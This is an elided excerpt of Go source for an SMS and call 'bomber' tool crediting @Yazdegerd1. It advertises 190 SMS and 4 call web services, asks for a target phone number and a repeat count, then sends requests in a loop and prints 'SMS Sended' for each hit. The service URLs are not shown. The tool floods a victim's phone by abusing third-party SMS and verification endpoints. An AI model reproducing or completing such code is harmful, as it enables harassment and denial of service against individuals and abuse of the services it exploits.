...
func sms(url string, header map[string]interface{}, ch chan<- int) {
	...
	if err != nil {
		fmt.Println("\033[01;33m[-] Error100 ! ")
	...
	time.Sleep(5 * time.Second)
	if err != nil {
		fmt.Println("\033[01;33m[-] Error200 ! ")
		ch <- http.StatusInternalServerError
		return
	}
	ch <- resp.StatusCode
...
func main() {
	...
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠇`)
	var phone string
	fmt.Println("\033[01;31m([\033[01;32m+\033[01;31m])\033[01;35m @Yazdegerd1")
	fmt.Println("\033[01;31m(\033[01;32m+\033[01;31m)\033[01;33m SMS bomber! number web service : \033[01;31m190 \n\033[01;31m(\033[01;32m+\033[01;31m) \033[01;33mCall bomber ! number web service : \033[01;31m4\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone Number [Example : 09000000000]: \033[00;36m")
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;34m")
	...
	for i := 0; i < repeatCount*183; i++ {
		...
		if statusCode == 404 || statusCode == 400 {
			fmt.Println("\033[01;35m[-] Can't Send, Error ! ")
		} else {
			fmt.Println("\033[01;31m[\033[01;37m+\033[01;31m] \033[01;32m SMS Sended")
		}
